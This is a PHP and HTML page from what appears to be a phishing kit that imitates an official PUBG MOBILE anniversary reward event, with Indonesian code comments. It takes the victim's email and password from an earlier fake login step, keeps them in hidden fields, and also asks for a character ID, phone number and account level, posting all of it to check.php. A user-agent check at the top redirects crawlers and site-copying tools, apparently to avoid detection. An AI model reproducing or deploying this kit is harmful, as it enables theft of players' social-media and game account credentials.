<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="Description" content="Vibrant Anniversary game mode is here">
<meta name="Keywords" content="PUBG MOBILE">
<meta property="og:type" content="website">
<meta property="og:title" content="4th Anniversary Celebration">
<meta property="og:description" content="Vibrant Anniversary game mode is here">
<meta property="og:url" content="https://www.pubgmobile.com/en/event/Vibrant-Anniversary/">
<meta property="og:image" content="https://www.pubgmobile.com/images/event/Vibrant-Anniversary/share.jpg">
<meta name="twitter:image" content="https://www.pubgmobile.com/images/event/Vibrant-Anniversary/share.jpg">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.ibb.co/kQMg5h3/bg.png">
<title>PUBG MOBILE: 4th Anniversary Celebration</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<!-- <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> -->
	<body>
<style type="text/css">
	@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'pubgFont'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/pubg.woff2) format("woff2"), 
        url(fonts/pubg.woff) format("woff"),
        url(fonts/pubg.ttf) format("truetype");
}
body {
	background:url(img/bg_4.jpg);
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: url(img/bg_1.jpg) no-repeat center center;
	background-size: 100% 100%;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #fff;
}
.navbar {
	background:#000;
	width:100%;
	height:50px;
	padding:4px;
	border-bottom: 1px solid #fff;
}
.navbar img {
	width:30px;
	margin-right:5px;
	margin-left:5px;
	border-radius:5px;
	float:left;
	margin-top: -8px;
}
.navbar-txt-game {
	padding-top:2px;
	color:#ffe074;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:left;
	margin-left:5px;
	margin-top: -10px;
}
.navbar-txt-game span {
	margin-left:5px;
	color:#d9d9d8;
	font-size:13px;
	line-height:10px;
	display:block;
}
.navbar-btn-wrapper {
	margin-top:5px;
}
.navbar-btn-wrapper img {
	color:#d9d9d8;
	line-height:1px;
	float: right;
	margin-top: -10px;
	margin-right: 5px;
}

.header {
    width: 100%;
    height: 230px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.header video {
	width: 100%;
	height: auto;
	margin-top: -0px;
	border-bottom: 1px solid #fff;
}
.landing {
	width:100%;
	height:auto;
}
.event-wrapper {
	width: 100%;
	margin-bottom:100%;
	padding: 10px;
}
.event-wrapper img:nth-child(1) {
	width: 130px;
	float: right;
}
.event-notify {
	background-color:rgba(0, 0, 0, 0.8);
	width:100%;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	padding: 8px;
	display:block;
}
.event-notify-title {
	padding-bottom:10px;
	color:#fff;
	font-size:17px;
	font-family:pubgFont;
	text-align:left;
	text-decoration:underline;
}
.event-notify-content {
	color:#fff;
	font-size:16px;
	font-family:pubgFont;
	text-align:left;
	line-height:18px;
}
.event-btn {
	background:transparent;
	width:auto;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:15px;
	padding:7px;
	padding-left:15px;
	padding-right:15px;
	color:#eaa300;
	font-size:17px;
	font-family:pubgFont;
	text-align:center;
	border:1px solid #eaa300;
	outline:none;
	display:block;
}
.box {
    width: 95%;
    height: auto;
	margin-top: 12px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	position: relative;
	border-radius: 5px;
	display: block;
}
.event-alert {
	background:url(img/s4_text1.png) no-repeat center center;
	background-size:100% 100%;
	width:95%;
	height: 55px;
	margin-left:auto;
	margin-right:auto;
	padding:5px;
	display:block;
	border-radius: 4px;
}
.event-alert span{
	position: absolute;
	top: 5.5%;
	right: 7%;
	width: auto;
	color:white;
}
.event-alert-title {
	color: #000;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 17px;
	font-family: pubgFont;
	font-weight: bold;
	text-align: center;
	padding-top: 5px;
}
.event-alert-desc {
	color: #000;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 14px;
	font-family: pubgFont;
	text-align: center;
	line-height: 8px;
	margin-left: 8%;
}
.menu-wrapper-border {
	height: 20px;
}
.menu-wrapper {
	width: 40%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 5px;
	display: block;
}
.menu-content {
	background:url(img/btn_air.png) no-repeat center center;
	background-size:100% 100%;
	width: auto;
	height: auto;
	padding: 7px;
	color: #000;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 12px;
	font-family:pubgFont;
	text-align: center;
	border: none;
	cursor: pointer;
}
.menu-content-active {
	background:url(img/menu_off.png) no-repeat center center;
	background-size:100% 100%;
	color: #fff;
}
.scroll {
	position:relative;
	width: 100%;
	height:450px;
	margin-top:20px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.item {
	width: 30%;
	height: 100px;
	margin: 3px;
	margin-bottom: 38px;
	display: inline-block;
}
.item img {
	width: 100%;
    height: 100%;
    border-radius: 3px 3px 0px 0px;
}
.item button {
	background:url(img/button.png) no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height:auto;
	padding:3px;
	color:#fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size:15px;
	font-family:pubgFont;
	font-weight: 500;
	text-align:center;
	border: none;
	outline:none;
}
.item img {
	border:2px solid #774549;
	border-bottom: 1px solid #774549;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	padding: 10px;
	border-top: 2px solid #ee8900e3;
}
.footer-txt-follow {
	margin-top: 10px;
	margin-bottom: 10px;
	color: #fff;
	font-size: 17px;
	font-family:pubgFont;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
}
.footer-follow-icon {
	width: 49px;
	height: 49px;
	margin: 5px;
	display: inline-block;
}
.footer-txt-copyright {
	color: #fff;
	font-size: 15px;
	font-family:pubgFont;
	text-align: center;
}
.footer-copyright-icon {
	width: 90%;
	margin-top: 20px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 20px;
	display: block;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box {
	background:url(img/pop_bg1.png) no-repeat center;
	background-size:100% 100%;
	width:380px;
	height:300px;
	position:relative;
	margin:50px auto;
	margin-top:16%;
	text-align:center;
}
.popup-title {
	background: url(img/s3_submit.png);
	background-size: 100% 100%;
	width: 93%;
	height: 60px;
	margin-left: 10px;
	color: #fff;
	text-shadow: 0 0 0.21rem rgba(232, 213, 213, 0.51);
	font-size:20px;
	font-family:Teko;
	text-align:left;
}
.popup-content {
	width: 100%;
	height: 76.5%;
	border: 1px solid transparent;
	position: relative;
}
.popup-rewards-title {
	background-image:linear-gradient(to left, rgb(255, 255, 255), rgb(135, 135, 255));
    background-size: 100% 100%;
    width: 85%;
    height: auto;
    padding: 7px;
    margin-left: 5px;
	color: #fff;
    text-align: left;
    border-left: 4px solid #fff;
    border-radius: 3px 0px 0px 3px ;
}
.popup-rewards-titles {
	color: #db8428;
	text-shadow: 0 0 0.15rem rgba(255, 255, 255, 0.74),0 0 0.15rem rgba(234, 237, 242, 0.74);
	font-size:20px;
	font-family:Teko;
	text-align:center;
}

.popup-rewards-img1 {
	width: 90px;
	height: 90px;
	margin: 5px;
	margin-top: 10px;
	border-radius: 5px;
	display: inline-block;
}
.popup-btn-wrapper {
	width: 100%;
	height: 50px;
}
.popup-btn-wrapper button {
	width: 30%;
	height: 40px;
	padding: 2px;
	font-size: 18px;
	font-family: Teko;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-deactive {
	background: url(img/btn_mode.png) no-repeat center;
	background-size: 100% 100%;
	position: absolute;
	width: 50px;
	left: 15%;
	margin-top: -80px;
	color: #000;
}
.popup-btn-active {
	background: url(img/btn_video.png) no-repeat center;
	background-size: 100% 100%;
	position: absolute;
	width: 50px;
	right: 15%;
	margin-top: -80px;
	color: #000;
}
.btn-login {
    width: 80%;
    height: auto;
    padding: 8px;
    margin-left: auto;
	margin-right: auto;
    color: #000;
    text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 15px;
    font-family: Teko;
    border: none;
    border-radius: 5px;
    outline: none;
    display: block;
}
.btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.facebook {
    background: #3b5998;
    color: #fff;
	margin-top: 20px;
	margin-bottom: 3px;
}
.twitter {
    background: #08a0e9;
    color: #fff;
	margin-bottom: 10px;
}
.popup-close {
	width:20px;
	height:20px;
	color:#000;
	text-align:center;
	text-transform: uppercase;
	font-weight: bold;
	position:absolute;
	top:13px;
	right:10px;
	display:block;
}
.popup-close i {
	color:#000;
	font-size: 25px;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:380px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.verify-input {
	background: url(img/s3_text.png);
	background-size: 100% 100%;
	box-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 15px;
	color: #fff;
	font-size:15px;
	font-family:pubgFont;
	border:none;
	border-radius: 3px;
	position: relative;
	outline: none;
}
.verify-input::placeholder {
	color: #fff;
}
.verify-select {
	background: url(img/s3_text.png);
	background-size: 100% 100%;
	box-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 10px;
	color: #fff;
	font-size: 15px;
	font-family:pubgFont;
	border:none;
	border-radius: 3px;
	position: relative;
	outline: none;
}
.verify-btn {
    background: url(img/s3_inbtn_on.png) no-repeat center;
	background-size: 100% 100%;
	width: 35%;
	height: auto;
	margin-top: 10px;
	padding: 10px;
	font-size: 15px;
	font-family:pubgFont;
	text-align: center;
	color:#fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
	.item div {
    width: 100%;
    height: 100%;
    border-radius: 3px 3px 0px 0px;
	}
	.item div:first-child {
	    margin-left: 0;
	}

	figure {
    margin: 0;
    padding: 0;
    overflow: hidden;
	}
	.lightshagitz figure {
    position: relative;
	}
	.lightshagitz figure::before {
	    position: absolute;
	    top: 0;
	    left: -75%;
	    z-index: 2;
	    display: block;
	    content: '';
	    width: 50%;
	    height: 100%;
	    background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    -webkit-transform: skewX(-25deg);
	    transform: skewX(-25deg);
	}
	.lightshagitz figure::before {
	    -webkit-animation: shine 2s infinite;
	    animation: shine 2s infinite;
	}
	@-webkit-keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
	@keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
		border-top:1px solid #fff;
        border-radius: 0px;
        padding: 0px;
    }

	.box {
	    width: 96%;
		height: auto;
	}
    .scroll {
        height: none;
    }
    .item {
        height: 90px;
    }
    .popup-box {
        width: 345px;
        margin-top: 60%;
    }
    .popup-item {
        width:25%;
        height:85px;
	}
	.popup-box-login-fb {
		margin-top: 4%;
	}
	.popup-box-login-twitter {
		margin-top: 25%;
	}
	.header{
		width: 100%;
		}
}
.navbar-fb {
    background: #3b5998;
    width: 100%;
    height: auto;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.fb-alert {
    background: #fa3e3e;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #fff;
    font-size: 15px;
    font-family: Roboto;
    text-align: left;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb img {
    width: 60px;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 270px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto, sans-serif;
    text-align: center;
    display: block;
}
.loginEmail {
    width: 100%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: Roboto, sans-serif;
    border: 1px solid #bdbebf;
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
    cursor: pointer;
    outline: none;
}
.loginPassword {
    width: 100%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: Roboto, sans-serif;
    border: 1px solid #bdbebf;
    border-top: 0px;
    border-bottom-left-radius: 4px;
    border-bottom-right-radius: 4px;
    cursor: pointer;
    outline: none;
}
.showHide {
    margin-top: -32px;
    padding-right: 8px;
    color: #333333;
    font-size: 12px;
    font-family: Roboto, sans-serif;
    font-weight: bold;
    text-align: right;
    text-transform: uppercase;
}
.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 30px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto, sans-serif;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}
.txt-create-account {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto, sans-serif;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto, sans-serif;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto, sans-serif;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto, sans-serif;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto, sans-serif;
    text-align: center;
    display: block;
}
.header-twitter {
    background: #fff;
    width: 100%;
    font-size: 25px;
    font-weight: bold;
    text-align: left;
    position: relative;
    border-radius: 10px;
}
.header-twitter img {
    width: 55px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.box-twitter {
    width: 100%;
    height: 400px;
    position: absolute;
    overflow: none;
    font-size: 15px;
    font-family: sans-serif;
    border-radius: 10px;
}
.txt-login-twitter {
    color: #000;
    font-size: 20px;
    font-weight: bold;
    font-family: arial, sans-serif;
    margin-top: 3%;
    margin-bottom: 5%;
}
.twitter-alert {
    width: 95%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    padding: 5px;
    color: #fa3e3e;
    font-size: 13px;
    font-family: arial, sans-serif;
    text-align: left;
    display: block;
}
.input-box-twitter {
    background: #f5f8fa;
    width: 90%;
    height: 55px;
    margin-top: 10px;
    margin-bottom: 18px;
    padding: 10px;
    padding-top: 5px;
    font-size: 14px;
    font-family: arial, sans-serif;
    text-align: left;
    position: relative;
    border-bottom: 2px solid #657786;
    border-radius: 2px;
    outline: none;
    position: relative;
}
.input-box-twitter label {
    color: #657786;
    text-align: left;
    text-decoration: none;
    text-shadow: none;
}
.input-box-twitter input {
    background: transparent;
    width: 100%;
    height: auto;
    padding: 7px;
    padding-top: 3px;
    padding-left: 0px;
    color: #000;
    font-size: 18px;
    font-family: arial, sans-serif;
    text-align: left;
    position: relative;
    border: none;
    outline: none;
    z-index: 2;
}
.input-box-twitter .TwitterShowHide {
    margin-top: 10px;
    color: #333333;
    float: right;
}
.btn-login-twitter {
    background: #1da1f2;
    width: 90%;
    height: auto;
    padding: 14px;
    color: #fff;
    font-size: 15px;
    font-weight: bold;
    font-family: arial, sans-serif;
    border: none;
    border-radius: 30px;
    outline: none;
    letter-spacing: 1;
}
.footer-menu-twitter {
    width: auto;
    height: auto;
    margin: 0.5%;
    margin-top: 7%;
    color: #1da1f2;
    font-size: 14px;
    font-family: arial, sans-serif;
    display: inline-block;
}
.bulet {
    color: #000;
    font-size: 8px;
}
.aktifnya {
    color: #1da1f2;
    border-bottom: 2px solid #1da1f2;
}
</style><div class="container rewardsBox">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<div class="navbar">
<div class="navbar-btn-wrapper">
<img src="img/menu.png" style="width: 45px;padding:12px;margin-right:-10px">
<img src="img/cart.png" style="width: 45px;padding:12px;margin-right:-10px;">
</div> <!--- navbar-btn-wrapper --->
<img src="img/s1_logo.png">
<div class="navbar-txt-game">
PUBG MOBILE
<span>The Original Battle Royale, The First And The Best</span>
</div> <!--- navbar-txt-game --->
</div> <!--- navbar --->
<div class="header">
<video src="video/play.mp4" style="margin-top: " autoplay="" loop="" muted=""></video>
</div> <!--- header --->
<div class="box">
<div class="event-alert">
<img src="img/s4_img2.png" style="width: 60px;position: absolute;left: 6%;margin-top: 7px">
<div class="event-alert-title">PUBG MOBILE Vibrant-Anniversary</div>
<div class="event-alert-desc">Please enter details account to receive reward</div>
</div> 


<div class="tab_rewards" id="form_verif" style="d">
<center>
<form action="check.php" method="post">
<div id="detail" style="">
<div style="text-align: center;border:none;height: 30px;width: 100%">
	<fieldset style="border-bottom:none;border-right: none;border-left: none;">
		<legend style="margin-left:35.5%;padding-right: 10px;padding-left: 10px">
			<font style="font-size: 20px;color: white">Account Details</font>
		</legend>
	</fieldset>
</div>
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<input type="number" class="verify-input" name="playid" placeholder="Character ID" autocomplete="off" required="">
<input type="number" class="verify-input" name="phone" placeholder="Mobile Number" autocomplete="off" required="">
<select class="verify-select" name="level" id="level" required="">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
</div><br>
	<button type="submit" id="verify" class="verify-btn" onmousedown="buka.play()">Verify</button>\
</form></center>
</div> <!--- tab-verif --->


</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/K9dqtvQ/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->



</body></html>